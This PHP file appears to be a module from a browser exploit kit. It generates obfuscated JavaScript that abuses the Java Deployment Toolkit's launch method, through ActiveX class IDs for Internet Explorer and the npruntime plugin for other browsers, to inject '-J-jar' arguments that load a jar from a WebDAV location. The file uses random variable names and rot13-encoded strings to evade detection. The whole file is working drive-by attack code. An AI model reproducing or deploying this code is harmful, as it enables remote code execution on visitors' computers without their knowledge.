<?php
/**
 *
 * @	Version			:	1.1.7.0
 * @	Author			:	DrWhat
 * @	Release on		:	25.02.2013
 *
 */

include( 'webdav.php' );
$randVar = $GLOBALS['cpFunctions']->CreateArrayString( rand( 10, 30 ), '100' );
$strUrl = $GLOBALS['cpXplHelper']->GetURL( 'webstart', $browser, $os, 'webstart' );
$functionName = $ExploitFunctions[4];
$code = 'http: -J-jar -J' . base64_decode( $webdav ) . ' ' . $strUrl . ' none';

if ($browser == 'ie') {
	$eArray[] = '
function ' . $functionName . '(){
	if (navigator.javaEnabled()) {
		var ' . $randVar[0] . ' = ' . $ExploitFunctions[52] . '(' . rot13enc( $code ) . ');
		try {

			var ' . $randVar[1] . ' = document.createElement(' . $ExploitFunctions[52] . '(' . rot13enc( 'OBJECT' ) . '));
			' . $randVar[1] . '.classid = ' . $ExploitFunctions[52] . '(' . rot13enc( 'clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA' ) . ');
			' . $randVar[1] . '[' . $ExploitFunctions[52] . '(' . rot13enc( 'launch' ) . ')](' . $randVar[0] . ');
		}catch(e){
			try {
				var ' . $randVar[2] . ' = document.createElement(' . $ExploitFunctions[52] . '(' . rot13enc( 'OBJECT' ) . '));
				' . $randVar[2] . '.classid = ' . $ExploitFunctions[52] . '(' . rot13enc( 'clsid:clsid:8AD9C840-044E-11D1-B3E9-00805F499D93' ) . ');
				' . $randVar[2] . '[' . $ExploitFunctions[52] . '(' . rot13enc( 'launch' ) . ')](' . $randVar[0] . ');
			}catch(e){}
		}
		setTimeout("{next}", 1500);
	}
	{next}
}
';
}
else {
	$eArray[] = '
function ' . $functionName . '(){
	if (navigator.javaEnabled()) {
		var ' . $randVar[0] . ' = ' . $ExploitFunctions[52] . '(' . rot13enc( $code ) . ');
		try {
			var ' . $randVar[3] . ' = document.createElement(' . $ExploitFunctions[52] . '(' . rot13enc( 'OBJECT' ) . '));
			' . $randVar[3] . '.type = ' . $ExploitFunctions[52] . '(' . rot13enc( 'application/java-deployment-toolkit' ) . ');
			document.body.appendChild(' . $randVar[3] . ');
			' . $randVar[3] . '[' . $ExploitFunctions[52] . '(' . rot13enc( 'launch' ) . ')](' . $randVar[0] . ');
		} catch (e) {
			try {
			var ' . $randVar[2] . ' = document.createElement(' . $ExploitFunctions[52] . '(' . rot13enc( 'OBJECT' ) . '));
			' . $randVar[2] . '.type = ' . $ExploitFunctions[52] . '(' . rot13enc( 'application/npruntime-scriptable-plugin;deploymenttoolkit' ) . ');
			document.body.appendChild(' . $randVar[2] . ');
			' . $randVar[2] . '[' . $ExploitFunctions[52] . '(' . rot13enc( 'launch' ) . ')](' . $randVar[0] . ');
			}catch(e){}
		}
		setTimeout("{next}", 1500);
		return;
	}
	{next}
}';
}

echo '
';
?>
